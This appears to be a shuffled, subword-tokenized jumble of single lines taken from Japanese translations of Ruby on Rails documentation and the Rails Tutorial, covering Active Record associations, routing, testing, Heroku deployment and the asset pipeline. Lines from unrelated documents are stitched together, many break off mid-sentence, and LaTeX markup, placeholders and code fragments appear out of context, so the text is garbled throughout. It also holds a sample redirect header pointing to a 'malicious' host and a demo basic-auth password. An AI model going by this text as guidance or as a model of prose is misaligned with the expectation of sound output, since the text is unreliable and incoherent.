▁* ▁[ 関連付け に関する 若 干 の 不 整 合 ]( https :// github ▖ com / rails / rails / commit / 302 c 9 12 b f 6 b cd 0 fa 200 d 9 64 ec 2 d c 4 a 44 a be 3 28 a 6 ) ▁ の ため 、 Rails ▁4▖0 では Active ▁Record から id entity ▁map が 削除 されました ▟ この 機能を アプリケーションで 手動で 有効 に したい場合は 、 今 や 無効 になった ` config ▖ active _ record ▖ id entity _ map ` を削除する 必要がある でしょう 。
▁( 1 行目 は 、 確 実に master ブランチ に切り替え るために 行 っています ▟ これにより 、2 行目 の \ k ode { static - pages } トピックブランチ が \ k ode { master } から 作成される ようになります 。
▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / P ub li c - key _ crypt o gr a ph y }{\ emph { 公開鍵 } } を ク リ ッ プ ボ ー ド に コピー します 。
▁$ ▁rails ▁console ▁test
▁今度は 、 ユーザー情報 を変更 するために \ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ページ を表示し てみましょう ▁( 図 \ ref { fig : demo _ edit _ user _ rails _3} ) 。
▁デフォルトでは 、 現在 ホスト されている public フォルダ 内の アセット に対して リンク します が 、 アプリケーション 設定 ▁( 通常 は ` config / environments / production ▖ rb ` ) ▁ の ` config ▖ action _ controller ▖ asset _ host ` で 設定 されている アセット 用 サーバー にリンクする こともできます 。
▁テストにパスする 必要のある 、 リスト { p 0} の {2} update {/2} アクションは 、 リスト \ ref { code : signin _ upon _ signup } に示したように 、 {2} create {/2} アクション ▁( リスト \ ref { code : user _ update _ action }) ▁ の 最終的な フォーム と ほぼ 同じです 。
▁ここで 、 改良 した 新しい プロフィール画面 を ブラウザで 見 てみましょう ▁( 図 \ ref { fig : user _ profile _ no _ microposts }) ▁ を ブラウザで 見 てみましょう
▁Sass では 、 冗 長 な コード を削除し 、 より 自 由 な 表現 を 可能 に するために 、\ emph { 変数 } が 定義 できる ようになっています 。
▁#### # ▁`: source _ type `
▁\ k ode { edit } アクションと \ k ode { update } アクション で 正しい ユーザー を要求する こと をテストする 。
▁` ob j ▖ to _ json ` と ` JSON ▖ parse ( str ) ` を使用して MultiJSON から 乗 り 換 え る 。
▁ 確 か に パラメータ は 表示される ようになりました が 、 何 の 加 工 も されていません 。
▁ 最適な 方法は 状 況 によって 異 なり 、 たとえば \ emph { 極めて 多数 } の 静的なページ を 1 つの StaticPages コントローラ だけ ま か なお う と すると 重 荷 になる 可能性があります ▟ 今回は いくつかの 静的なページ を 作る だけ なので 、 重 荷 に はなりません 。
▁Create d ▁ http :// st or my - cloud - 5 88 1 ▖ heroku app ▖ com / ▁|
▁ マイグレーション を実行すると \ k ode { admin } カラム が \ k ode { users } テーブル ▁( リスト \ ref { code : admin _ migration }) ▁ に追加されます 。
▁client ▁= ▁Client ▖ find ( [ 1, ▁10 ]) ▁# ▁Client ▖ find ( 1, ▁10 ) でも よい
▁ デフォルトの \ k ode { has _ many ▁through } 関連付け では 、 Rails は 単 一 バージョンの 関連付け に対応する 外部キー を探し ます ▟ つまり 以下のコード は
▁has _ many ▁: orders ▁do
▁Active ▁Support では これらの メソッドを 拡張 して 、 他の 範囲 指定 を 引数 で 指定 できるように しています 。
▁#### ▁ 任意の ファイル を使用して 出力する
▁このコードは リスト \ ref { code : header _ partial } で使用されていました ▟ もうひとつ 、
▁ どの メールアドレス で 失敗した のか を知る こと は非常に 便利です ▟ そこで リスト \ ref { code : email _ format _ valid _ tests } では 、\ k ode { each } メソッドを使って 各 メールアドレスを 順に テスト しています ▟ ループ さ せずに テスト すると 、 失敗した 行 番号 から と メールアドレス の 行 数を 照 ら し 合わせ て 、 失敗した メールアドレスを 特定 する といった 作業 が発生し てしまいます 。
▁ nick ▖ p ers ist ed ?
▁Rails は この場合 、\ k ode { : uniqueness } を \ k ode { true } と 判 断 します 。
▁* ▁` auto play : ▁true ` は ページ 読み込み 時に 音 声 ファイル を再 生 します 。
▁\ ref { sec : strong _ parameters } で 説明したとおり 、\ emph { S trong ▁Parameters } を使用して これ を行います ▟ 具体的には 、 ▁ 以下のように \ k ode { params } ハッシュ に対して \ k ode { require } と \ k ode { permit } を呼び出します 。
▁has _ many ▁: customers , ▁ dependent : ▁: destroy
▁この リスク の詳細については 、[ セキュリティ ガイド ]( security ▖ html # クロスサイトスクリプティング - x s s ) の クロスサイトスクリプティング の 節 を参照してください 。
▁ 従来 は 、 CSS と JavaScript を 整 理 するために 、 機能を 個 別の ファイルに 分割 し 、( インデント を 多 用 して ) ▁ 読みやすい フォーマット に 整 え ていました 。
▁ ユーザーを データベースから 見つけ て 検証 する
▁now ▁- ▁1▖ week
▁\ k ode { home } アクションに マイクロポストの インスタンス変数 を追加する
▁Active ▁Record で サポート される コールバック の種類 の詳細については 、 Rails ▁Guides の 「\ href { http :// guides ▖ rubyonrails ▖ org / v 3 ▖ 1▖23 / active _ record _ validations _ callback s ▖ html } { コールバック について } ▁( 英語 )」 を参照してください 。
▁以下は 、 名前 を出力する ための ループ です 。
▁<%= ▁render ▁partial : ▁" product " ▁%>
▁User モデルに \ k ode { password \_ digest } 属性 を追加し 、 Gemfile に bcrypt を追加した ことで 、 よう や く User モデル 内で \ k ode { has \_ secure \_ password } が 使える ようになりました ▁( リスト \ ref { code : has _ secure _ password }) 。
▁R ile y ▁ Mo s es による ご 指 摘 に 感 謝 いた します 。
▁( 上の コマンド 操作 では 、\ ref { sec : planning _ the _ application } の Heroku アプリ を作成 済み であること が 前 提 です 。
▁ テストスイート を き ち ん と 整 備 しておくこと が い か に 重要 である か 、 皆さん にも ご 理解 いた だけ る と思います 。
▁この 点を 強 化 するために 、 検索 機能を実装し てください 。
▁ システムによっては 、 ここで 一 旦 Rails サーバーを再起動 させる 必要があります ▟ 再起動 させ たら テストスイート を 走 ら せ てみてください ▟ {0}{1}{/1}{1}{2} 成功 {/2} {/1}{1}{/1}{/0} している はずです 。
▁{0} 図 3▖1 {/0} ▁{1} サンプルアプリケーションの \ k ode { config } ディレクトリ の内容 {/1}
▁` Marshal ` の拡張
▁### ▁ パス と URL 用 ヘルパー
▁Git は 、 ブランチ ▁(\ emph { branch }) ▁ を 極めて 簡 単 かつ 高速 に 作成 することができます ▟ ブランチ は 基本的に は リポジトリ の コピー で 、 ブランチ 上で は 元の ファイルを 触 らず に 新しい コードを書く など 、 自由に 変更 や 実 験 を 試 す ことができます 。
▁上の ` create _ association ` と同じ ですが 、 レコードが invalid の 場合に ` ActiveRecord :: RecordInvalid ` が raise される 点 が異なります 。
▁### ▁ 名前付き ルーティングヘルパー に プレフィックス を追加する
▁### ▁` unscope `
▁ 実は Ruby ▁1▖9 以降 では 、 ハッシュの 要素 の順序 が 入力 順 と同じ であること を 保 証 しています が 、 ハッシュ を 特定の 順序 に依存し て カウント するのは 得 策 ではありません 。
▁この gem では 、 ページの レンダリング を 多くの ページ で 高速 化 するのに Ajax を使用しています 。
▁\ k ode { S ec ure R an dom ▖ url safe _ base 64 } は 決 して 空欄 には \ emph { なら なく な った } ので 、 User モデルの テストはパスするはずです 。
▁#### # ▁` collection ▖ destroy ( object , ▁ ▖▖▖)
▁ パスワード の 不 一 致 テストは この すぐ 後 に追加する ので 、 上のコード では パスワード と パスワード の 確 認 を 両方 とも 空欄 に することで パスワード の \ emph { 存 在 } 確 認 テストを 行 なっています 。
▁1▖ ▁` belongs _ to ` 関連付け を使用する場合 は 、 外部キー を作成する必要があります ▟ 2▖ ▁` has _ and _ belongs _ to _ many ` 関連付け を使用する場合 は 、 適切な 結合テーブル を作成する必要があります 。
▁これにより 、 Active ▁Model ▁ Seri al ize rs と Active ▁Record オブジェクトの デフォルトの 動作 が 同じ になりました 。
▁Active ▁Job を使用することで 、 特定の キュー に 入 っている ジョブ を ス ケ ジ ュ ー リ ング することができます 。
▁ このような で たら め の サブドメイン 名 なら 、 URL を 教 え ない限り サイト にアクセス される 心 配 も ありません 。
▁* ▁` config ▖ action _ controller ▖ action _ on _ un permitted _ parameters ` は 、 明示的に 許可 されていない パラメータ が 見 つ か った 場合に ログ出力 または 例外 発生 を行なう かどうかを指定します 。
▁変更の結果 、 Home ページ は 図 \ ref { fig : home _ page _ follow _ stats } のようになります 。
▁詳細については ドキュメント を参照してください 。
▁{0} 図 2▖ 4 ▁{/0}{1} Users リソース ▁(\ href { http :// localhost :3000/ users }{/ users }) ▁ ページ の最初の 状態 {/1}
▁これで 少し 見え てきました ▟ 今 から 書く アプリケーションコード でも これ と同じ 方法 を使用する ことにしましょう 。
▁作成した アプリケーションを Heroku の 本番環境 に デプロイ した 。
▁ この時点で 、 サンプルアプリケーション は Web サイト として の 十分 な 基 盤 ▁( ユーザーを 認 証 したり 認可 したり ) ▁ が 整 った と い え る でしょう 。
▁ テンプレート 内に flash の メッセージ が 差 し 込 まれ るので 、 次のような コードは 、
▁resources ▁: photos , ▁except : ▁: destroy
▁create _ table ▁: employee s ▁do ▁| t |
▁class ▁C
▁ この問題 は \ ref { sec : a _ flash _ test } で 修正 します 。
▁ ERb によって 実際に 生成される HTML は それ ほど 重要 ではありません が 、 興 味 がある 方 のために 、 以下の 核 心 部分 をお見せします 。
▁ 共通の バリデーション オプション
▁この すべて を実装 した結果 を 、 リスト \ ref { code : relationships _ controller } に示します 。
▁< h 1> Book s ▁are ▁ com ing ▁soon !
▁# ▁▖▖▖
▁以下は 、 その 中の ご く わずか に過ぎません 。
▁ 残 念 な ことに 、 実は まだ 大きな セキュリティホール があります ▟ ある程度 の 腕 前 を持つ 攻撃者 なら 、 コマンドラインで \ text tt { DELETE } リクエスト を直接 発行する という 方法で サイトの 全 ユーザーを削除 してしまう ことができる でしょう 。
▁そこで 、\ k ode { user ▖ remember \_ token } メソッド ▁( cookies の 保存 場所 です ) ▁ を使用して トークン にアクセス できるように する必要があります ▟ しかも 、 トークン を データベースに \ emph { 保存 せずに } 実装 する必要があります 。
▁今度は データベース を 覗 いて 、 新規ユーザー が 確 か に 登録 されている ことを ダブルチェック しましょう 。
▁` helpers _ path ` パラメータ を明示的に 使用している 場合 を除いて 、 この 変更 は エンジン から ヘルパー を 読み込む 方法 に しか 影 響 しません 。
▁このコードは リスト \ ref { code : initial _ failing _ signin _ test } で使用されていました ▟ もうひとつ 、
▁ o h t TE c H ▖▖▖" >╼ \ end { code }╼╼\ subsection { 本章の まとめ } ▁% ▁( fold )╼\ label { sec : modeling _ users _ what _ we _ learned _ in _ this _ chapter }╼╼\ begin { item ize }╼\ item
▁上の コメント は 、\ k ode { before } ▁ ブロック のコード が 慣 用 的な 意味 で 正しく ないこと を 指 摘 しています 。
▁ 段 階 ごとに テスト を作成して RSpec を実行する ことで 、 テスト駆動開発 によって アプリケーション 開発 を進める 方法を 理解 できるように なる でしょう 。
▁ まったく 同じ ことを マイクロポスト で 行います 。
▁S ent ▁mail ▁to ▁ michael @ michael hartl ▖ com ▁( 6 6 ▖ 8 m s )╼ Date : ▁Thu , ▁ 04 ▁Sep ▁2014 ▁01 : 04 : 59 ▁+0000 ╼ From : ▁no reply @ example ▖ com ╼ To : ▁ michael @ michael hartl ▖ com ╼ Message - ID : ▁< 5 4 07 babbe e 1 3 9 _ 87 22 b 2 57 d 04 57 6 a @ mhartl - rails - tutorial - 9 5 37 53 ▖ mail >╼ S ub j ec t : ▁ Password ▁reset ╼ M i me - Version : ▁1▖ 0 ╼ Content - Type : ▁ multipart / alternative ; ╼ ▁b ound ary =" - - == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 " ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼ ╼╼ - --- == _ mime part _5407 babbe 3 50 5 _ 87 22 b 2 57 d 045617 ╼ Content - Type : ▁text / plain ; ╼ ▁ cha r set = UT F -8 ╼ Content - Transfer - Encoding : ▁7 bit ╼╼ To ▁reset ▁your ▁password ▁click ▁the ▁link ▁below : ╼╼ http :// rails - tutorial - c 9 - mhartl ▖ c 9 ▖ io / password _ resets / 3 B d B r X e Q Z S W q F ID R N 8 c x HA / ╼ edit ?
▁Rails の ルーター は 受け取った URL を 認 識 し 、 適切な コントローラ 内 アクションに 割り当て ます 。
▁ 参 考 資 料
▁ レイアウト に footer パーシャル を追加する
▁ サイト ロゴ に CSS を追加する
▁| ▁GET ▁| ▁ / kategorien ▁| ▁categories # index ▁| ▁categories _ path ▁|
▁# ▁ 今 年 を デフォルト値 に 持ち 、 19 00 年 から 200 9 年 まで を オプション に 持つ セレクト ボックス を生成する
▁` new ` メソッド を実行すると 単 に 新しい オブジェクト が返されます が 、` create ` を実行すると 新しい オブジェクト が返され 、 さらに データベースに保存 されます 。
▁t ▖ references ▁: public ation _ type
▁ このコード では 、 昨 日 作成された 注文 ▁( order ) ▁ を持つ すべての クライアント を検索し ます ▟ ここで も SQL の ` BETWEEN ` 式 を使用しています 。
▁ ファイル が表示される ように するには 、 ファイル ナ ビ ゲ ー ター の 歯車 アイコン をクリックして ▁[ Re f re sh ▁File ▁T re e ] ▁ をクリックします ▟)
▁ 状 況 によって は 動的 コンパイル ▁( li ve ▁ com p i l ation ) ▁ を使用した い ことも ある でしょう 。
▁before _ save ▁: set _ author
▁ この時点で 、( 送信 ボタン を 押 しても エラー が 出 ない という 意味 で ) ▁ ユーザー登録フォーム は 動く ようになります 。
▁ バージョン管理 を使用している場合 は 、 い つ も と同じように トピックブランチを作成 します 。
▁ http _ basic _ authenticate _ with ▁name : ▁" d h h ", ▁password : ▁" secret ", ▁only : ▁: destroy
▁< li >`: password ` ▁- ▁ メール サーバー で 認 証 が必要な場合は ここで パスワード を指定する ▟ </ li >
▁ デバッグ モード をオフに すると 、 上の マニフェストファイル によって 以下 が 生成される ようになります 。
▁#### ▁Rails ▁ 全体 のテスト を実行する
▁\ k ode { current \_ user } の 「 記 憶 」 ブランチ を テスト できたので 、 今後 は 手動で ひとつ ひとつ 確認し なくても 、 自 信 を 持 って 回 帰 バグ を キャッチ できます 。
▁リスト \ ref { code : example _ user } では 、 以下のように Ruby の \ k ode { attr \_ accessor } メソッド を使用しました 。
▁ 実際の Active ▁Record の実装 は 、 単 に ` tableize ` を実行する 場合 よりも 複 雑 です ▟ Active ▁Record では クラス名 に対して ` demodulize ` も 行 っ ており 、 返される 文字列 に 影 響 する 可能性のある オプション も いくつか チェック しています 。
▁ したがって 、 今回は 手動で \ k ode { picture \_ size } という 独自の バリデーション を定義します ▟ 結果は リスト \ ref { code : micropost _ model _ image _ validation } のとおり です 。
▁`: constraints ` では 正規表現 を使用できます が 、 ここでは 正規表現 の 「 ア ン カ ー 」 は 使用 できない という 制限 がある ことにご注意ください 。
▁Rails アプリケーション と エンジンの 開発者 は 、 これらの アセットを 手動で ` app / assets ` に置き 、` config ▖ assets ▖ precompile ` を設定し てください 。
▁ アセットパイプライン を有効に している場合 は 以下の 設定 を追加します 。
▁テストにパスする ことも 確 認 しておきましょう 。
▁<%= ▁yield ▁: head ▁%>
▁\ ref { sec : showing _ users } では もっと 本格的な ユーザー一覧ページ を作成する 予定です 。
▁ 適切な ` config / environments / $ RAILS _ ENV ▖ rb ` ファイル に追加する 設定 の例 を以下に示します 。
▁ 先ほど から 申し上げ ている ように 、` Article ` モデル は 名前空間化され ています ので 、 この モデル を参照 する 際に は ` Blorgh :: Article ` と 指定 する必要があります 。
▁beginning _ of _ quarter ▁( at _ beginning _ of _ quarter )
▁これは 、 以下のように イニシャライザ ファイル ` config / initializers / sandbox _ email _ interceptor ▖ rb ` で 行います 。
▁ /* ▁ mixin s , ▁variables , ▁etc ▖ ▁* /
▁ 今回の To y アプリケーションでは 、 ユーザー と 短い マイクロポスト のみ を サポート する マ イ ク ロ ブログ を作成します 。
▁ ターミナル ウィンドウ で Spork を 起動 する 。
▁Gemfile を更新し たら 、 いつものように ` bundle ▁install ` を実行する の を 忘れ ずに 。
▁1 つ目の 地 味 な 問題 です ▟ ユーザーは 場合によっては 、 同じ サイト を 複数の ウィンドウ ▁( あるいは タブ ) ▁ で 開 い ている こともあります ▟ ログアウト 用 リンク は ログイン 中に は 表示 されません が 、
▁=> ▁[#< Micropost ▁id : ▁1, ▁content : ▁" First ▁micropost !" , ▁user _ id : ▁1, ▁ ╼ created _ at : ▁"2011- 11-0 3 ▁02:37:37" , ▁updated _ at : ▁"2011- 11-0 3 ▁02:37:37" > ,
▁Rails のルーティング には ` resources ` メソッド があり 、 これ を使用して REST リソース への 標準的な ルーティング を 宣言 できます ▁( 訳 注 : ▁REST については [ W ikipedia ]( http :// ja ▖ w ikipedia ▖ org / wiki / REST ) を参照してください ) 。
▁password _ digest : ▁" $ 2 a $ 10 $ k n 4 c Q D J T z V 76 Z g D x O W k 6 J e 9 A 0 T t n ▖▖▖"
▁ マイグレーション が 完了 すれば 、 To y アプリ を 実際の PostgreSQL データベース を バックエンド に 配置 した 本番環境で 利用できる よう になっている はずです ( 図 \ ref { fig : toy _ app _ production }) 。
▁ユーザー登録 に 失敗した場合 の 最後の 手順 として 、 問題が生じ た ために ユーザー登録 が 行われ なかった という ことを ユーザーに わかりやすく 伝える エラーメッセージ を追加しましょう 。
▁#### # ▁ レイアウト の 継 承
▁ここで 1 つ 問題 があります ▟ Git は \ emph { すべての } ファイルの 変更 履 歴 を 管理 する ようになっています が 、 管理 対象 に含め たくない ファイル もあります 。
▁ Location : ▁ http :// www ▖ malicious ▖ t ld
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁しかし 、 ここで 不思議 な 点 がいくつも あります 。
▁git ▁commit : ▁% Q { ▁- m ▁' Initial ▁commit ' ▁ }
▁< meta ▁content =' text / html ; ▁ cha r set = UT F -8 ' ▁ http - equ i v =' Content - Type ' ▁/>
▁Using ▁the ▁ generalized ▁\ k ode { authenticated ?}
▁ コメント の 削除 も 認 証 済み ユーザーに だけ 許可 したい ので 、` Comments Controller ` ▁( ` app / controllers / comments _ controller ▖ rb ` ) ▁ に 以下のように 追 記 しましょう 。
▁たとえば 、 name と email を持つ ユーザー を保存する のであれば 、\ k ode { name } と \ k ode { email } の カラム を持つ \ k ode { users } テーブル を作成します ▁( 各 行 は 1 人のユーザー を表し ます ) 。
▁INFO : ▁` beginning _ of _ hour `、` end _ of _ hour `、` beginning _ of _ minute `、` end _ of _ minute ` は ` Time ` および ` DateTime ` への 実装 ですが 、` Date ` への 実装 では ▁** ありません ** ▁ ▟ ` Date ` インスタンス に対して 時間 や 分 の 最 初 や 最 後 を 問い合わせ る 意味 はありません 。
▁ パーシャル レイアウト は 、 対応する 通常の パーシャル と同様 、 名前 の 先 頭 に アンダースコア を追加する 必要があります ▟ そして 、 パーシャル と それに対応する パーシャル レイアウト は 同じ ディレクトリに 置く 必要があります ▟ パーシャル レイアウト は ` layouts ` フォルダ ー には 置 け ません のでご注意ください 。
▁この テスト には 、 管理者 自身 を削除する ための リンク が 管理者 に 表示 されていない ことを確認する テスト も 含 まれ ている ことに注意してください 。
▁Rails の JavaScript は 、「 控 え め な JavaScript 」 原 則 に基いて 、 JavaScript による 要素 と Ruby による 要素 の 2 つの 要素 で 構成 されています 。
▁ デフォルトの 出力結果 は 、 Co C の よい 例 で もあります 。
▁* ▁X - Runtime ヘッダー を生成します ▟ この ヘッダー には リクエスト の 処理 に か か った 時間 が 秒 単 位 で 表示されます 。
▁development モードでは false 、 production モードでは true に設定し ます 。
▁さらに モデルの テーブル も 名前空間化され 、 単 なる ` articles ` ではなく ` blorgh _ articles ` になります 。
▁ そのために まず 、 好 み の エディタ で \ k ode { Gemfile } を開き ます 。
▁# ▁ 何か 書く
▁もちろん 読者 の 皆 様 は 、 目的 に応じて どちらの サービス を 選 んで も か ま いません 。
▁ 統合テスト と ビュー が更新され たら 自動的に 適切な テストが 実行される ように 、 生成された \ k ode { Guardfile } を 編集 します ▁( リスト \ ref { code : guard file }) 。
▁" O h ▁ dear ! ▁Oh ▁ dear !
▁@ open _ orders ▁= ▁@ customer ▖ orders ▖ find (1)
▁=> ▁[ 17 , ▁ 42, ▁ 8 ]
▁( コントローラ 名 には 複数形 を使い 、 モデル名 には 単数形 を 用 い る という 慣習 を 頭 に 入 れ て おいてください ▟ コントローラは Users で モデル は User です ) 。
▁* ▁` after _ enqueue `
▁ ちなみに 、 最初に redirect 文 を実行して も 、 セッション が 削除 される 点を 覚え て おくとよいでしょう ▟ 実は 、 明示的に \ k ode { return } 文 や メソッド 内の 最 終 行 が呼び出され ない限り 、 リダイレクト は 発生 しません ▟ したがって 、 redirect 文 の 後 にある コード でも 、 その コードは 実行される のです 。
▁ 先に 紹 介 した ` ordinal ` メソッドは 、 序 数 文字列 ▁** だけ ** ▁ を返す 点が 異なる ことにご注意ください 。
▁1) ▁# ▁=> ▁true
▁before _ save ▁ { ▁return ▁false ▁ } ▁# ▁ 良 く ない
▁resources ▁: photos , ▁as : ▁' images '
▁original _ process ( action , ▁params , ▁session , ▁flash , ▁ http _ method )
▁これらの 機能 ごとに 新しい リソース を作成し 、 それぞれの コントローラ / ルーティング / データベース 移 行 の例 について 見 て い く ことにします 。
▁\ k ode { microposts } テーブルに は \ k ode { user \_ id } 属性 が あるので 、 これを 辿 って 対応する 所有 者 ▁( ユーザー ) ▁ を 特定 する ことができ ました ▁(\ ref { sec : the _ basic _ model }) 。
▁ モックアップ に基いて 作成した 最 終 結果は 図 \ ref { fig : site _ with _ footer } で 確 認 することができます 。
▁\ k ode { index } アクション が 実行 され 、 そこ から User モデルに 、「 すべての ユーザーを 取り 出 せ 」( \ k ode { User ▖ all }) と 問い合わせ る 。
▁Ruby の キーワード でない 、 英語 として の " true " と " false " には regular フォント ▁( It al ic や Bo ld でない フォント ) ▁ を使用すること 。
▁ここで 以下の ルール に注目し てみましょう 。
▁この モジュール は 、 画像 ・ JavaScript ファイル ・ スタイルシート ・ フィード などの アセット に ビューを リンク する HTML を生成する メソッド を提供します 。
▁ それぞれの アクション では 、 タイトル を設定し 、 ユーザー を検索し 、\ k ode {@ user ▖ followed _ users } または \ k ode {@ user ▖ followers } から データ を取り出し 、 ページネーション を 行 な って 、 ページ を出力する 必要があります 。
▁Rails アプリケーション のバージョン が 3▖0 より 前 の場合 、 まず 3▖0 へのアップグレード を 完了 してから Rails ▁3▖1 へのアップグレード に と り か か ってください 。
▁select を使用すると 、 選択 した フィールド だけ を使用して モデルオブジェクト が 初期化 される ため 、 注意してください 。
▁person ▁= ▁Person ▖ create ( name : ▁" !
▁Active ▁Model
▁item ▖ with _ lock ▁do
▁ ライブラリ や Gem を プリプロセッサ 化 する
▁このセクションでは 冒 頭 で ` count ` メソッドを 例 に 取 って 説明 しています が 、 ここで 説明 されている オプションは 以下の すべての サブ セクション にも 該 当 します 。
▁concern を使用することで 、 他の リソース や ルーティング 内で 使い ま わ せる 共通の ルーティング を 宣言 することができます 。
▁" X "▖ constantize ▁# ▁=> ▁: in _ Object ▁( ! )
▁リスト \ ref { code : layout _ with _ partial s } では 、 以下のように \ k ode { render } と呼ばれる Rails ヘルパー 呼び出し だけ を使って 、 HTML ▁ shim の スタイルシート 行 を 置 換 しています 。
▁上の メソッド で使用されている 項目 について 簡単に 説明します 。
▁以下の SQL ス ニ ペ ッ ト と 置き換え ることができます 。
▁t ▖ belongs _ to ▁: part
▁\ emph { クエリ パラメータ } を使用して 、 この URL に メールアドレス も うまく 組み 込 んで みましょう ▟ クエリ パラメータ とは 、 URL の 末 尾 で 疑問符 「 ? 」 に 続けて キー と 値 の ペ ア を記述し た ものです
▁ インスタンス レベル の ` respond _ to ` は 今回の アップグレード の 影 響 を受け ません ので 、 gem を追加する 必要はありません 。
▁{0} 表 7 ▖ 1 {/0} ▁{1} リスト \ ref { code : rails _ routes } の Users リソース が提供する RESTful な ルート {/1}
▁#### ▁ シンプルな ビューで パーシャル を使用する
▁# ▁ マイクロポスト が データベースから なく な った ことを確認
▁{0}{1} 表 2▖2 {/1}{/0} の URL には 重複 している もの がある ことにご注目ください ▟ たとえば 、\ k ode { show } アクションと ▁\ k ode { update } アクションは 、 どちらも / users /1 という URL に 対応 しています 。
▁Rails ▁2▖ x のデフォルトの クエリ 文字列 は ファイルの 更新 日付 に基いて いました 。
▁ あ の 頃 は ユーザー登録 すら ありません でした が 、 今は 登録 も サインイン も サインアウト も できます ▟ プロファイル の表示 も 、 設定 の 編集 も 、 すべての ユーザーの インデックス ページ もあります ▟ 一部の ユーザーは 他の ユーザーを削除する こと すら できるようになりました 。
▁unless ▁token ▖ blank ?
▁def ▁article _ params
▁このメソッド の 背 後に は 強力な \ emph { イン フ レ ク ター ▁( 活用 形 生成 ) ▁ } ▁ があり 、 不 規 則 活用 を含む さまざまな 単語 を 複数形 に することができます 。
▁ただし 、 検証 に 1 つ でも 失敗する と 、 ▁\ k ode { update \_ attributes } の 呼び出し は 失敗します ▟ たとえば 、\ ref { sec : adding _ a _ secure _ password } で 実装 する 、 パスワードを レコード に保存 すること を要求する と 検証 は 失敗します 。
▁さらに ` pluck ` は 、` select ` などの ` Relation ` スコープ と異なり 、 クエリ を直接 トリガ する ので 、 その 後ろに 他の スコープ を 連 鎖 する ことはできません ▟ ただし 、 構成 済み の スコープ を ` pluck ` の 前に 置く ことは できます 。
▁このメソッド には 略 記 法 もあります 。
▁なお 、\ k ode { created _ at } カラム は 、\ ref { sec : ordering _ and _ dependency } や \ ref { sec : render ing _ microposts } の実装 を 進 めて い く 上で 必要な カラム です 。
▁次の 章では 、 この {0} 第 {1} 1 {/1} 章 {/0} で学んだ ことを 基 礎 として 、 データベース を備えた \ emph { toy アプリ } を 製 作 し 、 Rails で どんな ことができる か を さらに 詳 しく 学びます 。
▁TIP : ▁これらの ミドルウェア は いずれも 、 Rack の ミドルウェアスタック に 利用できます 。
▁config ▖ assets ▖ configure ▁do ▁| env |
▁* ▁` p reload `
▁ ただ 最初は 少し 見 分 け づ ら い の も 事 実 です ▟ たとえば \ k ode { : name } は シンボル として 独 立 しています が 、 引数 を 伴 わ ない \ k ode { name : } では 意味 が 成り立 ち ません 。
▁belongs _ to ▁: author , ▁class _ name : ▁Blorgh ▖ author _ class
▁( リスト \ ref { code : edit _ tests _ logged _ in } の \ k ode { setup } メソッド 内で ログイン 処理を まとめ てしまう ことも 可能です ▟ しかし 、\ ref { sec : friendly _ forwarding } で 片 方 のテスト を ログイン する \ emph { 前に } 編集 ページ にアクセス するよう に変更し たい ので 、 ここで まとめて しま って も 結 局 は 元に戻す こと になってしまいます ▟)
▁デフォルトは ` false ` であり 、 この場合 関連付けられたオブジェクト は 保存 時に 検証 されません 。
▁ 本書 の 残 り では 、\ emph { モックアップ } ▁( Web の 文 脈 では よく ▁\ emph { ワ イ ヤ ー フ レ ーム } と呼ばれ ます ) ▁という 、 最終的な アプリケーションの 外 観 を 示す 一種の ラ フ ス ケ ッ チ を使用する ことにします
▁さらに Rails は 、 無効な 内容 で 送信 が されて 元の ページに 戻 される と 、\ k ode { div } で 囲 まれ た エラー 用の CSS クラス \ k ode { field \_ with \_ errors } を返します 。
▁Client ▖ order (" orders _ count ▁ASC ", ▁" created _ at ▁DESC ")
▁[ \ href { http :// localhost :3000/ users ? page = 2 } {2} ] ▁ リンク または ▁[ \ href { http :// localhost :3000/ users ? page = 2 } { N ext } ] ▁ リンクをクリックすると 、 図 \ ref { fig : user _ index _ page _ two _ rails _3} のように 次の ページ に移動し ます 。
▁{0} 図 9 ▖ 7 {/0} ▁{1} 保 護 された ページ にアクセス した 直後 の ログインフォーム {/1}
▁この To y アプリケーションは もちろん 動 きます が 完成 品 ではなく 、 しかも 多くの 手順 が 「 魔 法 」 のように 思える かもしれません ▟ {0}{1} 第 3 章 {/1}{/0} 以降 で 作成する サンプルアプリケーション では 同等の 機能を 1 つ 1 つ 手動で 作成します ので 、 ご 安 心 ください 。
▁\ k ode {@ name } 変数 に \ k ode {" Example ▁User "} という 値 を設定します ▟ 同様に \ k ode { email } 属性 にも 値 を設定します ▟ これらの 値は \ k ode { formatted \_ email } メソッドで 使用されます 。
▁このコードは リスト \ ref { code : account _ activation _ view _ text } で使用されていました ▟ もうひとつ 、
▁リスト { p 0} の {2} store _ location {/2} メソッドでは 、 ▁ リクエストが 送 られた URL を {2} session {/2} 変数 の {2} : forwarding _ url {/2} キー に 格 納 しています ▟ ただし 、 {2} GET {/2} リクエストが 送 られた とき だけ 格 納 する ように しておきます 。
▁* ▁Ruby ▁on ▁Rails のコード に 貢献 する方法
▁ 前 章 の 終わり では 、 Rails の レイアウト を使用して ビューで の 重複 を 取り除く ために 、 ほぼ 静的なページ を 単 に 更新 した に と ど まり ました ▁( リスト \ ref { code : application _ layout _ redux })▟ これは 、 リスト \ ref { code : application _ layout } と同じ ものです 。
▁ プリプロセッサ エンジン
▁` before _ add ` コールバック が 例外を発生 した 場合 、 オブジェクトは コレクション に 追加 されません 。
▁def ▁ notify ( user , ▁ ▖▖▖)
▁この To ▁get ▁this ▁to ▁work , ▁we ▁need ▁to ▁define ▁the ▁\ k ode { password _ reset _ expired ?}
▁なお 、 特に 断 り の ない限り 、 Rails を含む すべての ソフトウェア は チュートリアル で使用されている もの と同じ バージョン を使用してください ▟ そうでない と同じ 結果を 得 ら れ ない ことがあります 。
▁そこで 今度は ` Article sController ` コントローラ 内に ` create ` アクション を作成し 、 フォーム が動作する ようにしましょう 。
▁M ac ▁OS ▁X を含む 多くの Unix 系 OS では プロンプト として ド ル 記 号 ` $ ` が使用されます 。
▁person ▁= ▁Person ▖ new
▁\ ref { sec : a _ user _ class } の User クラス と同様に 、 User モデルのインスタンス は ドット 記 法 を 用 いて その 属性 にアクセス することができます 。
▁以下の メソッドは すべて 再 実装 される ため 、 これら を使用する ために ` active _ support / core _ ext / date / calculations ▖ rb ` を 読み込む 必要 は ▁** ありません ** ▁ 。
▁ バリデーション エラー に対応する
